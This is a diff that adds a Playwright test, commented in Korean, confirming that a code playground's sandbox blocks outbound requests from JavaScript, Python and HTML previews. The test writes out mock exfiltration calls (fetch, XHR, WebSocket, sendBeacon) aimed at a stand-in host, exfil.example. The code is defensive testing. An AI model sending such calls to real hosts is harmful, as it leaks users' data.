@@ -213,3 +213,55 @@ test('JSX 미리보기에서 그리는 중에 난 오류를 빈 화면 대신 �
   // 미리보기 안의 오류는 의도한 것이라 콘솔 오류 검사에서 뺀다
   errors.list.splice(0, errors.list.length, ...errors.list.filter((e) => !e.includes('undefinedVar')));
 });
+
+test('실행 · 미리보기 코드는 바깥 서버로 데이터를 보낼 수 없다', async ({ page, context, errors }) => {
+  // 보안 정책이 없다면 이 주소로 가는 요청이 성공한다 — 한 번도 닿지 않아야 한다
+  const leaked: string[] = [];
+  await context.route(/^https:\/\/exfil\.example\//, (route) => {
+    leaked.push(route.request().url());
+    return route.fulfill({ status: 200, contentType: 'text/plain', body: 'ok', headers: { 'access-control-allow-origin': '*' } });
+  });
+  await openCodeWorkspace(page, '보안');
+
+  // JavaScript 실행: fetch · XHR · WebSocket 모두 막힌다
+  await replaceCode(
+    page,
+    [
+      "for (const f of [() => fetch('https://exfil.example/fetch?d=secret'), () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open('GET', 'https://exfil.example/xhr'); x.onload = ok; x.onerror = no; x.send(); })]) {",
+      "  try { await f(); console.log('LEAKED'); } catch { console.log('BLOCKED'); }",
+      '}',
+      "await new Promise((done) => { try { const ws = new WebSocket('wss://exfil.example/ws'); ws.onopen = () => { console.log('WS OPENED'); done(); }; ws.onerror = () => { console.log('BLOCKED'); done(); }; } catch { console.log('BLOCKED'); done(); } });",
+    ].join('\n'),
+  );
+  let text = await runAndWait(page);
+  expect(text).not.toContain('LEAKED');
+  expect(text).not.toContain('WS OPENED');
+  expect(text.match(/BLOCKED/g)?.length).toBe(3);
+
+  // 파이썬 실행: pyodide의 JS 연결(js.fetch)로도 못 보낸다
+  await chooseLanguage(page, 'Python');
+  await replaceCode(page, "import js\ntry:\n    await js.fetch('https://exfil.example/py')\n    print('LEAKED')\nexcept Exception:\n    print('BLOCKED')");
+  text = await runAndWait(page);
+  expect(text).toContain('BLOCKED');
+  expect(text).not.toContain('LEAKED');
+  // 추가 패키지(numpy 등)를 받는 Pyodide CDN 주소는 열려 있다 (테스트에서는 빈 응답으로 대신한다)
+  await replaceCode(page, "import js\nr = await js.fetch('https://cdn.jsdelivr.net/pyodide/v0/full/numpy.whl')\nprint('CDN', r.status)");
+  expect(await runAndWait(page)).toContain('CDN 200');
+
+  // HTML 미리보기: fetch · 폼 전송이 막힌다 (doctype 앞 · head 밖에 둔 스크립트도)
+  await chooseLanguage(page, 'HTML');
+  await replaceCode(
+    page,
+    "<script>fetch('https://exfil.example/early').then(() => console.log('LEAKED'), () => console.log('BLOCKED-EARLY'))</script>\n<h1>보안</h1>\n<script>navigator.sendBeacon && navigator.sendBeacon('https://exfil.example/beacon', 'x'); fetch('https://exfil.example/late').then(() => console.log('LEAKED'), () => console.log('BLOCKED-LATE'))</script>",
+  );
+  await run(page);
+  await expect(page.frameLocator('iframe.code-preview').locator('h1')).toHaveText('보안', { timeout: 30_000 });
+  if (!(await output(page).isVisible())) await page.getByRole('button', { name: '출력 패널' }).click();
+  await expect(output(page)).toContainText('BLOCKED-EARLY');
+  await expect(output(page)).toContainText('BLOCKED-LATE');
+  expect(await output(page).innerText()).not.toContain('LEAKED');
+
+  expect(leaked, '바깥 서버에 닿은 요청').toEqual([]);
+  // 보안 정책 위반 경고는 의도한 것이라 콘솔 오류 검사에서 뺀다
+  errors.list.splice(0, errors.list.length, ...errors.list.filter((e) => !/exfil\.example|Content Security Policy|Failed to fetch/.test(e)));
+});
